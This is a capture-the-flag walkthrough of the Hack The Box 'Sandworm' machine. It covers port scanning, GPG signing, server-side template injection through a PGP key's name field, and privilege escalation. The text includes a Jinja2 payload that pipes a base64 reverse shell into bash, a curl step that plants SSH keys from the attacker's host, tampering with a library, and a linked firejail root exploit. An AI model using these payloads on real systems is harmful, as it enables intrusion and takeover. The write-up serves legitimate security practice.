---
description: https://app.hackthebox.com/machines/Sandworm
---

# Sandworm

> from hackthebox

![image](https://user-images.githubusercontent.com/56447720/247915265-ab265e9a-b810-4d69-8b66-cd6f2ec5092e.png)

## Port scan

```bash

PORT     STATE SERVICE   REASON  VERSION
22/tcp   open  ssh       syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
80/tcp   open  http      syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://ssa.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
443/tcp  open  ssl/http  syn-ack nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA/emailAddress=atlas@ssa.htb/organizationalUnitName=SSA/localityName=Classified
| Issuer: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA/emailAddress=atlas@ssa.htb/organizationalUnitName=SSA/localityName=Classified
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-04T18:03:25
| Not valid after:  2050-09-19T18:03:25
| MD5:   b8b7:487e:f3e2:14a4:999e:f842:0141:59a1
| SHA-1: 80d9:2367:8d7b:43b2:526d:5d61:00bd:66e9:48dd:c223
| -----BEGIN CERTIFICATE-----
| MIIDpTCCAo0CFBEpfzxeoSRi0SkjUE4hvTDcELATMA0GCSqGSIb3DQEBCwUAMIGN
| MQswCQYDVQQGEwJTQTETMBEGA1UECAwKQ2xhc3NpZmllZDETMBEGA1UEBwwKQ2xh
| c3NpZmllZDEaMBgGA1UECgwRU2VjcmV0IFNweSBBZ2VuY3kxDDAKBgNVBAsMA1NT
| QTEMMAoGA1UEAwwDU1NBMRwwGgYJKoZIhvcNAQkBFg1hdGxhc0Bzc2EuaHRiMCAX
| DTIzMDUwNDE4MDMyNVoYDzIwNTAwOTE5MTgwMzI1WjCBjTELMAkGA1UEBhMCU0Ex
| EzARBgNVBAgMCkNsYXNzaWZpZWQxEzARBgNVBAcMCkNsYXNzaWZpZWQxGjAYBgNV
| BAoMEVNlY3JldCBTcHkgQWdlbmN5MQwwCgYDVQQLDANTU0ExDDAKBgNVBAMMA1NT
| QTEcMBoGCSqGSIb3DQEJARYNYXRsYXNAc3NhLmh0YjCCASIwDQYJKoZIhvcNAQEB
| BQADggEPADCCAQoCggEBAKLTqQshN1xki+1sSRa6Yk5hlNYWroPyrVhm+FuKMpNL
| cjW9pyNOV/wvSdCRuk/s3hjqkIf12fljPi4y5IhqfcpTk+dESPGTiXdrE7oxcWHn
| jQvE01MaT9MxtIwGiRBupuFvb2vIC2SxKkKR28k/Y83AoJIX72lbeHJ9GlNlafNp
| OABrIijyFzBou6JFbLZkL6vvKLZdSjGy7z7NKLH3EHTBq6iSocSdxWPXtsR0ifeh
| hODGT2L7oe3OWRvClYTM3dxjIGC64MnP5KumamJoClL2+bSyiQzFJXbvcpGROgTU
| 01I6Qxcr1E5Z0KH8IbgbREmPJajIIWbsuI3qLbsKSFMCAwEAATANBgkqhkiG9w0B
| AQsFAAOCAQEAdI3dDCNz77/xf7aGG26x06slMCPqq/J0Gbhvy+YH4Gz9nIp0FFb/
| E8abhRkUIUr1i9eIL0gAubQdQ6ccGTTuqpwE+DwUh58C5/Tjbj/fSa0MJ3562uyb
| c0CElo94S8wRKW0Mds0bUFqF8+n2shuynReFfBhXKTb8/Ho/2T2fflK94JaqCbzM
| owSKHx8aMbUdNp9Fuld5+Fc88u10ZzIrRl9J5RAeR5ScxQ4RNGTdBVYClk214Pzl
| IiyRHacJOxJAUX6EgcMZnLBLgJ1R4u7ZvU3I3BiaENCxvV6ITi61IwusjVCazRf3
| NNn7kmk7cfgQqPCvmwtVrItRHxWEWnkNuQ==
|_-----END CERTIFICATE-----
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Secret Spy Agency | Secret Security Service
8000/tcp open  http-alt? syn-ack
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

* There was no intresting directories to further investigate.

## Foothold

* After further enumeration, the best page to further pwn was `/guide`
* here, we can verify the pgp signature with our public key.

![image](https://user-images.githubusercontent.com/56447720/250083559-9fb7532f-0c39-453e-afa3-3def58556ca9.png)

* now we create our own public key and signature to verify it here.

<details>

<summary>What is gpg? How to create a key? (Detailed)</summary>

**Step 1: Install GnuPG**

GnuPG (GPG) is a widely-used implementation of PGP for Linux. It provides the tools necessary for generating and managing PGP keys, as well as signing and encrypting messages. Installing GnuPG ensures that you have the required software to work with PGP.

* You can install GnuPG by running the following command in your terminal:

```bash
sudo apt-get install gnupg
```

**Step 2: Generate a key pair**

A key pair consists of a public key and a private key. The public key can be freely distributed to others, while the private key should be kept secret and protected. When someone wants to send you an encrypted message or verify your signature, they use your public key.

* To generate a key pair, use the following command:

```bash
gpg --gen-key
```

This command will start an interactive process to guide you through key generation. You will be prompted to provide your name, email address, and a passphrase to protect your private key. Your name and email address are used to associate the key with your identity.

**Step 3: Find your key ID**

Each key pair has a unique identifier called a key ID. The key ID is used to identify your public key and distinguish it from others. It's important to know your key ID when sharing your public key with others or when referencing your key in commands or configurations.

* To list your generated keys and find your key ID, run the following command:

```bash
gpg --list-keys
```

* It will look like this :

<img src="https://user-images.githubusercontent.com/56447720/250085690-e23a21c3-95e5-4079-b12e-9a46cce7d2c3.png" alt="image" data-size="original">

**Step 4: Sign a message**

Signing a message involves using your private key to generate a digital signature that verifies the authenticity and integrity of the message. When you sign a message, recipients can use your public key to verify that the message was indeed signed by you and has not been tampered with.

To sign a message using your private key, you need the message text saved in a file. Let's assume the message is stored in a file called message.txt.

* Use the following command to sign the message:

```bash
gpg --clearsign --output signature.asc --local-user <your-key-ID> message.txt
```

Replace with your actual key ID. This command will generate a signed version of the message in ASCII-armored format and save it in a file called signed\_message.asc. The ASCII-armored format allows the signed message to be easily shared via email or other text-based communication methods.

That's it! You've now created a PGP key pair, found your key ID, and signed a message using your private key. Remember to keep your private key secure and protected, as it is the key to verifying your identity and signing messages.

</details>

<details>

<summary>TLDR; (Short version of key creation)</summary>

```bash

# Install GnuPG
sudo apt-get install gnupg

# Generate a key pair
gpg --gen-key

# List keys and find your key ID
gpg --list-keys

# Sign a message using your private key
gpg --clearsign --output signature.asc --local-user <your-key-ID> message.txt

# Print your public key
gpg --export --armor <your-key-ID>

```

* Your key would look like this :

<img src="https://user-images.githubusercontent.com/56447720/250085690-e23a21c3-95e5-4079-b12e-9a46cce7d2c3.png" alt="image" data-size="original">

</details>

## Finding web vuln

* After we create our signature and public key, let's check it out on the website.

![image](https://user-images.githubusercontent.com/56447720/250088309-0f8b1783-f2a3-415d-9c31-67ff84a50b61.png)

* We can see that our name is echo(ed) out. Maybe a SSTI Vulnerability.
* We have to manipulate the name parameter. Let's edit our key.

### Exploitation

* Enter the following command :

```bash
gpg --edit-key 6941D2162010EED2C <--REDACTED--> # YOUR KEY

```

* To select the uid: (Enter the number that is along with your key)

![image](https://user-images.githubusercontent.com/56447720/250091351-d5cd13d5-f51d-40ec-8658-5e8925ca538d.png)

* A `*` will appear once it's selected
* Creating payload :

![image](https://user-images.githubusercontent.com/56447720/250091622-f8b21421-239c-44d7-9e87-c8484b9e1e60.png)

> The blue line denotes the command, the yellow denotes the payload.

* Create a signed message :

```bash
gpg --clearsign --output signature.asc --local-user <your key> message.txt
```

* Export public key

```bash
 gpg --export --armor <your key> > heapbytes.pub   
```

**SSTI**

* We can confirm that SSTI can be expoitated here.

![image](https://user-images.githubusercontent.com/56447720/250092457-ae1bf828-1fd9-4b21-824d-925fd51046fd.png)

* Repeat the steps with your own payload
* The one I used was :

```bash
 
#create rev shell payload from https://revshells.com
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo " <replace your base64 encoded rev shell payload>" | base64 -d | bash').read() }}

```

![image](https://user-images.githubusercontent.com/56447720/250096559-c01598ff-11b1-4c34-92db-d073cd2f7f94.png)

* And we got the shell

## User shell

* After a few while, I found an intresting file which had the password of the user.
* `~/.config/httpie/sessions/localhost_5000/admin.json`

### **SSH with the creds**

![image](https://user-images.githubusercontent.com/56447720/250097981-7ce5d2f6-7e60-471b-ad7a-dfca971650fb.png)

* DONE

### Privilage Escalation (2)

![image](https://user-images.githubusercontent.com/56447720/250100000-4f27fb4b-9b01-42bd-9165-d53371a2f948.png)

* Source code of the running application

![image](https://user-images.githubusercontent.com/56447720/250110738-59d87655-de3a-4817-95af-168d93b84068.png)

* It's using a logger library, and fortunately we have access to write down into that library.
* Path of the logger library :

![image](https://user-images.githubusercontent.com/56447720/250111049-b18ec1af-8dd0-4e58-a7d0-a05ee149c440.png)

* Let's edit the library code

![image](https://user-images.githubusercontent.com/56447720/250115668-4a4405fd-a2ac-4586-88ff-e2023e9dcfb9.png)

* Wait for few minutes (less than 2 mintues) to get the shell.

## Privilage Escalation (root)

![image](https://user-images.githubusercontent.com/56447720/250120305-02088181-5fb7-4d12-9f57-766f0a07d683.png)

* We are going to use this script to get root
  * https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25
* We can add our `ssh keys` into the remote machine for better shell experience.
* Create your own key with :

```bash
  
ssh-keygen -t rsa -b 4096 -C "your_mail@domain"
```

* Copy the `~/.ssh/id_rsa.pub` into remote machine under `/.ssh/`
  * I used curl to download the file since vim was not working properly (maybe stablize shell and resume)
  * `curl <your-ip>/id_rsa.pub ~/.ssh/authorized_keys`
  * `chmod 700 ~/.ssh`
  * `chmod 600 ~/.ssh/authorized_keys`
* boom, we just need to ssh now and run the script, I used curl agian to copy the script from my local machine to the remote machine.

![image](https://user-images.githubusercontent.com/56447720/250175917-4227a8a7-1386-4b8b-9a4d-0c51257bf4e7.png)

* Run the `firejail --join=<id>` command as prompted into another ssh shell.
* now run `su -` or `su` for the root shell.

![image](https://user-images.githubusercontent.com/56447720/250175791-35740f32-c6e5-4aa9-a0b0-842104938dea.png)

\_\_\_\_\_\_\_\_\_\_heapbyte's still pwning.
